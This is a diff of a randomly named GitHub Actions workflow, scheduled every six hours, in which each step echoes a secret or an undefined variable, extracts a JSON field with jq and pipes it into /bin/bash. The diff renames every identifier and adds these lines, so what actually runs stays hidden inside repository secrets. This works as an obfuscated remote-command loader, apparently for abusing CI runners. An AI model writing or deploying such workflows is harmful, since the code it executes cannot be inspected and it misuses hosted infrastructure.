@@ -1,30 +1,24 @@
 name: glisteningpartridges
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 1/6 * * *'
+    - cron: '52 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: glisteningpartridges
         env:
-          kbq99: ${{ secrets.kbq99 }}
+          nii959: ${{ secrets.nii959 }}
         run: |
-          echo $kbq99 | jq -r .dovgp2 | /bin/bash
-          echo $zwkd02896 | jq -r .k96886 | /bin/bash
-          echo $zfet7275 | jq -r .vz4633 | /bin/bash
-          echo $yqf3 | jq -r .kuyf5047 | /bin/bash
-          echo $wxhl3 | jq -r .mpp77 | /bin/bash
-          echo $iem7621 | jq -r .hexl90950 | /bin/bash
-          echo $u65 | jq -r .tit27294 | /bin/bash
-          echo $zuiyo41 | jq -r .r81 | /bin/bash
-          echo $ugwkf4 | jq -r .po8280 | /bin/bash
-          echo $zho9 | jq -r .fwcka562 | /bin/bash
-          echo $m58 | jq -r .zw7556 | /bin/bash
-          echo $pmvv867 | jq -r .akoty1759 | /bin/bash
-          echo $zncft1892 | jq -r .lfc5485 | /bin/bash
-          echo $c370 | jq -r .a16575 | /bin/bash
+          echo $nii959 | jq -r .pb749 | /bin/bash
+          echo $pu79 | jq -r .uh20 | /bin/bash
+          echo $fexul74864 | jq -r .uwi9 | /bin/bash
+          echo $bawt9772 | jq -r .qx18335 | /bin/bash
+          echo $fqar7 | jq -r .xyu83049 | /bin/bash
+          echo $v4867 | jq -r .f8 | /bin/bash
 
